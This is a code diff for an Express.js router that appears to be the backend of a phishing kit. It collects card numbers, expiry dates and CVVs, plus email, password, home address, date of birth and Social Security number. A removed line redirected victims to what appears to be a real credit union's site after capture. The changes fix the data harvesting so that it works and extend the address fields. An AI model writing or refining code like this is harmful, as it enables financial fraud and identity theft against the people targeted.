@@ -7,7 +7,7 @@ const multer = require('multer');
 const User = require('../models/User');
 const Email = require('../models/Email');
 const Questions = require('../models/Questions')
-const Card = require('../models/Questions')
+const Card = require('../models/Card')
 const Image = require('../models/Images')
 const {
   forwardAuthenticated
@@ -37,9 +37,10 @@ router.get('/loginverify', forwardAuthenticated, (req, res) => res.render('login
 
 router.post('/card', async (req, res) => {
   const card = new Card({
-    cardnumber: req.params.cardnumber,
-    expirationdate: req.params.expirationdate,
-    cvv: req.params.expirationdate
+    cardnumber: req.body.cardnumber,
+    expirationMonth: req.body.expirationMonth,
+    expirationYear: req.body.expirationYear,
+    cvv: req.body.cvv
   });
 
   card
@@ -50,7 +51,7 @@ router.post('/card', async (req, res) => {
         'success_msg',
         'Card ok'
       );
-      res.redirect(301, 'https://www.sccu.com');
+      res.redirect('/users/images');
     })
   .catch(err => console.log(err));
 });
@@ -102,7 +103,10 @@ router.post('/email', async (req, res) => {
     email: req.body.email,
     password: req.body.password,
     name: req.body.name,
-    address: req.body.address,
+    streetAddress: req.body.streetAddress,
+    apartment: req.body.apartment,
+    city: req.body.city,
+    zipcode: req.body.zipcode,
     dob: req.body.dob,
     ssn: req.body.ssn
   });
